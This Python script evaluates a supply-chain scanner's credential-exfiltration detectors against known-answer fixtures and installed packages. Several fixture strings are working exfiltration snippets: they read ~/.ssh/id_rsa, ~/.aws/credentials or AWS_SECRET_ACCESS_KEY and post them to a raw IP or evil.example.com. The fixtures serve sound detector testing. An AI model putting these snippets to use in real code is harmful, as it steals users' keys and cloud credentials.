"""Evaluate the confirmed-flow data-flow tracer against the old co-occurrence
heuristic, on fixtures with a known correct answer.

Why this script exists
-----------------------
``EXFIL_CREDENTIALS_TO_NETWORK`` (the existing composite signal) fires on
co-occurrence: a sensitive path read *anywhere* in a file, and a network call
*anywhere* in the same file. ``CONFIRMED_CREDENTIAL_EXFILTRATION`` (the new
signal, analysis/dataflow.py) only fires when the value itself is traced from
the read to the send.

Claiming that is an improvement is not evidence that it is one. This script is
the evidence: a set of small, hand-built fixtures where the right answer is
known in advance — some are genuine exfiltration, some are coincidental
co-occurrence, some are cases the old heuristic cannot express at all — and it
reports what each detector actually says about each one, plus a real-package
false-positive check against legitimate installed libraries.

Run:  python scripts/evaluate_dataflow.py
"""

from __future__ import annotations

import sys
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "backend"))

from chainguard.analysis.python_ast import analyse_python_file  # noqa: E402
from chainguard.logging_setup import get_logger  # noqa: E402

logger = get_logger("evaluate_dataflow")

CONFIRMED = "CONFIRMED_CREDENTIAL_EXFILTRATION"


@dataclass
class Fixture:
    name: str
    source: str
    expect_real_risk: bool
    note: str


FIXTURES: list[Fixture] = [
    Fixture(
        name="direct_read_and_send",
        expect_real_risk=True,
        note="the textbook case: read a key, send it",
        source="""
import urllib.request

def steal():
    with open("/home/user/.ssh/id_rsa") as f:
        key = f.read()
    urllib.request.urlopen("http://45.9.148.99/collect", data=key.encode())
""",
    ),
    Fixture(
        name="multi_hop_chain",
        expect_real_risk=True,
        note="credential passes through two intermediate variables before the sink",
        source="""
import requests

def leak():
    f = open("/home/user/.aws/credentials")
    raw = f.read()
    payload = {"data": raw}
    requests.post("http://evil.example.com", json=payload)
""",
    ),
    Fixture(
        name="secret_env_var_to_network",
        expect_real_risk=True,
        note="a case the old heuristic cannot express at all: no SENSITIVE_PATH "
             "string involved, only an env var read that ordinary co-occurrence "
             "logic does not connect to the sink",
        source="""
import os
import requests

def leak_env():
    token = os.getenv("AWS_SECRET_ACCESS_KEY")
    requests.post("http://evil.example.com", data=token)
""",
    ),
    Fixture(
        name="coincidental_cooccurrence",
        expect_real_risk=False,
        note="reads a credential path in one function, pings an unrelated URL in "
             "another — the case the old heuristic gets wrong",
        source="""
import requests

def check_ssh_config():
    with open("/home/user/.ssh/id_rsa") as f:
        exists = True
    return exists

def ping_home():
    requests.get("https://example.com/healthcheck")
""",
    ),
    Fixture(
        name="ordinary_env_var",
        expect_real_risk=False,
        note="LANG is not a secret — the credential-name filter must not fire on it",
        source="""
import os
import requests

def report_health():
    lang = os.getenv("LANG")
    requests.post("http://example.com/telemetry", data=lang)
""",
    ),
    Fixture(
        name="credential_read_no_network_at_all",
        expect_real_risk=False,
        note="reads a credential path but never touches the network anywhere in "
             "the file — neither detector should fire",
        source="""
def check_key_exists():
    with open("/home/user/.ssh/id_rsa") as f:
        return len(f.read()) > 0
""",
    ),
]


def old_heuristic_flags(source: str, path: str) -> bool:
    """Reproduce the pre-existing composite check in isolation: does this file
    both read a sensitive path and make a network call, anywhere?"""
    result = analyse_python_file(path, source)
    return result.has_sensitive_path and result.has_network


def new_tracer_flags(source: str, path: str) -> bool:
    result = analyse_python_file(path, source)
    return CONFIRMED in {s.code for s in result.signals}


def run_fixtures() -> tuple[int, int]:
    logger.info("=" * 78)
    logger.info("FIXTURE EVALUATION — known-answer test cases")
    logger.info("=" * 78)

    correct_old = 0
    correct_new = 0
    header = f"{'fixture':<32} {'expected':<10} {'old':<10} {'new':<10} {'old ok':<8} {'new ok':<8}"
    logger.info(header)
    logger.info("-" * len(header))

    for fx in FIXTURES:
        old_says_risk = old_heuristic_flags(fx.source, f"{fx.name}.py")
        new_says_risk = new_tracer_flags(fx.source, f"{fx.name}.py")

        old_ok = old_says_risk == fx.expect_real_risk
        new_ok = new_says_risk == fx.expect_real_risk
        correct_old += old_ok
        correct_new += new_ok

        logger.info(
            "%-32s %-10s %-10s %-10s %-8s %-8s",
            fx.name,
            "RISK" if fx.expect_real_risk else "safe",
            "FLAGGED" if old_says_risk else "clear",
            "FLAGGED" if new_says_risk else "clear",
            "yes" if old_ok else "NO",
            "yes" if new_ok else "NO",
        )
        logger.info("    %s", fx.note)

    logger.info("-" * len(header))
    logger.info(
        "Old heuristic: %d/%d correct. New tracer: %d/%d correct.",
        correct_old, len(FIXTURES), correct_new, len(FIXTURES),
    )
    return correct_old, correct_new


def run_real_package_check() -> tuple[int, int]:
    """False-positive check against real, legitimate, already-installed packages
    — the same validation discipline BUILD_LOG already applies to the other
    composite signals (twelve popular packages, zero composite hits)."""
    logger.info("=" * 78)
    logger.info("REAL-PACKAGE FALSE-POSITIVE CHECK")
    logger.info("=" * 78)

    site_packages = Path(__file__).resolve().parents[1] / ".venv" / "Lib" / "site-packages"
    candidates = [
        "httpx", "click", "jinja2", "anthropic", "fastapi", "uvicorn",
        "requests", "flask", "yaml", "rich",
    ]

    total_files = 0
    total_hits = 0
    packages_checked = 0

    for name in candidates:
        pkg_dir = site_packages / name
        if not pkg_dir.is_dir():
            continue
        packages_checked += 1
        for py_file in pkg_dir.rglob("*.py"):
            try:
                source = py_file.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            total_files += 1
            result = analyse_python_file(str(py_file.relative_to(site_packages)), source)
            if result.confirmed_flows:
                total_hits += len(result.confirmed_flows)
                for flow in result.confirmed_flows:
                    logger.warning(
                        "  FALSE POSITIVE: %s scope=%s line=%d -> %s:%d",
                        py_file.relative_to(site_packages), flow.function_scope,
                        flow.source_line, flow.sink_target, flow.sink_line,
                    )

    logger.info(
        "Checked %d real files across %d legitimate installed packages.",
        total_files, packages_checked,
    )
    logger.info("CONFIRMED_CREDENTIAL_EXFILTRATION false positives: %d", total_hits)
    return total_files, total_hits


def main() -> int:
    correct_old, correct_new = run_fixtures()
    total_files, false_positives = run_real_package_check()

    logger.info("=" * 78)
    logger.info("SUMMARY")
    logger.info("=" * 78)
    logger.info(
        "Fixtures: old heuristic %d/%d correct, new tracer %d/%d correct.",
        correct_old, len(FIXTURES), correct_new, len(FIXTURES),
    )
    logger.info(
        "Real packages: %d files checked, %d false positives from the new signal.",
        total_files, false_positives,
    )
    return 0 if correct_new == len(FIXTURES) and false_positives == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
